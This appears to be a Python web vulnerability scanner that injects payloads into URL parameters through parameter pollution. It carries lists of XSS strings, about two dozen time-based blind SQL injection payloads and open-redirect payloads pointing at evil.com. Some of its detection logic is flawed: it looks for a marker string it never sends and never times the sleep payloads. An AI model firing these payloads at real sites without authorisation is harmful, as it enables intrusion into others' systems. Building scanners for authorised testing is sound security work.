import time
import requests
from datetime import datetime

# Define constants for messages
INFO = "[\033[94m{}\033[0;0m] INFO: ".format(datetime.now().strftime("%H:%M:%S"))
WARNING = "[\033[94m{}\033[0;0m] WARNING: ".format(datetime.now().strftime("%H:%M:%S"))
VULNERABILITY = "[\033[94m{}\033[0;0m] VULNERABILITY: ".format(datetime.now().strftime("%H:%M:%S"))

# Define payloads directly in the code
xss_payloads = [
    {"name": "XSS Test 1", "payload": "<script>alert(1)</script>"},
    {"name": "XSS Test 2", "payload": "'\"><img src=x onerror=alert(1)>"},
    # Add more XSS payloads here
]

sqli_payloads = [{
		"name": "Blind SQLi using XOR",
		"payload": "1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",	
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "1'=sleep(25)='1",	
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi using SELECT query",
		"payload": "'%2b(select*from(select(sleep(2)))a)%2b'",	
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " WAITFOR DELAY '0:0:25';--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi using SLEEP()",
		"payload": "') OR SLEEP(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "1') AND SLEEP(25) AND ('LoUL'='LoUL",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' WAITFOR DELAY '0:0:25' and 'a'='a;--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " IF 1=1 THEN dbms_lock.sleep(25);",	
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "; SLEEP(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " SLEEP(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' SLEEP(25)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' SLEEP(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi using pg_sleep()",
		"payload": " pg_sleep(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " DBMS_LOCK.SLEEP(25);",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "1,'0');waitfor delay '0:0:25;--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' and pg_sleep(25)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": ")) and pg_sleep(25)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "')) or pg_sleep(25)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "')) or sleep(25)--",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "(SELECT 1 FROM (SELECT SLEEP(25))A)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "'%2b(select*from(select(sleep(25)))a)%2b'",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "/**/xor/**/sleep(25)",
		"timeout" : "25"
	},
	{
		"name": "Blind SQLi",
		"payload": "' or (sleep(25)+1) limit 1 --",
		"timeout" : "25"
	}
]

open_redirect_payloads = [
    {"name": "Open Redirect Test 1", "payload": "http://evil.com"},
    {"name": "Open Redirect Test 2", "payload": "https://www.google.com"},
    # Add more Open Redirect payloads here
]

open_redirect_xss_payloads = [
    {"name": "Open Redirect XSS Test 1", "payload": "http://evil.com/<script>alert(1)</script>"},
    {"name": "Open Redirect XSS Test 2", "payload": "https://www.google.com/<img src=x onerror=alert(1)>"},
    # Add more Open Redirect XSS payloads here
]

def check_parameter_pollution(params, payloads, verbose, arg):
    for i, payload_data in enumerate(payloads):
        name = payload_data['name']
        payload = payload_data['payload']
        for parameter, param_value in params.items():
            if param_value == "":
                print(WARNING + "\033[1mThe following parameter {} doesn't have any value. You are required to add one.\033[0;0m".format(parameter))
                exit()
            else:
                print(INFO + "Finding reflected point(s) via Parameter Pollution for parameter {}".format(parameter))
                time.sleep(3)
                response_text = requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=arg.headers, proxies=arg.proxies, allow_redirects=arg.allow_redirects, verify=arg.verify, cookies=arg.cookies).text
                if "reflectedhere" not in response_text:
                    print(INFO + "No reflective point found via Parameter Pollution, skipping...")
                    break
                else:
                    print(VULNERABILITY + "\033[1mFound reflected point via Parameter Pollution for parameter {}\033[0;0m".format(parameter))
                    time.sleep(4)
                    print(INFO + "Fuzzing for XSS vulnerability since reflected point is detected")
                    time.sleep(3)

                    if verbose:
                        print(INFO + "Testing parameter {} for Parameter Pollution {}".format(parameter, name))
                    else:
                        print(INFO + "Testing for Parameter Pollution {} on parameter {} ({}/{})".format(name, parameter, i, len(payloads) - 1))
                    
                    response_text = requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=arg.headers, proxies=arg.proxies, allow_redirects=arg.allow_redirects, verify=arg.verify, cookies=arg.cookies).text
                    if payload in response_text:
                        print(VULNERABILITY + "\033[1mParameter {} is vulnerable to {} via Parameter Pollution\033[0;0m".format(parameter, name))
                        print("Payload: {}".format(payload))
                    else:
                        print(INFO + "No vulnerability detected for parameter {}".format(parameter))

def parameter_pollution(params, arg):
    # Check XSS payloads
    check_parameter_pollution(params, xss_payloads, arg.verbose, arg)

    # Check SQLi payloads
    check_parameter_pollution(params, sqli_payloads, arg.verbose, arg)

    # Check Open Redirect payloads
    check_parameter_pollution(params, open_redirect_payloads, arg.verbose, arg)

    # Check Open Redirect XSS payloads
    check_parameter_pollution(params, open_redirect_xss_payloads, arg.verbose, arg)

# Example usage
class Args:
    def __init__(self):
        self.full_site = "http://example.com"
        self.headers = {}
        self.proxies = {}
        self.allow_redirects = True
        self.verify = True
        self.cookies = {}
        self.verbose = True

# Define the parameters
params = {
    "param1": "value1",
    "param2": "value2",
    # Add more parameters as needed
}

arg = Args()
parameter_pollution(params, arg)

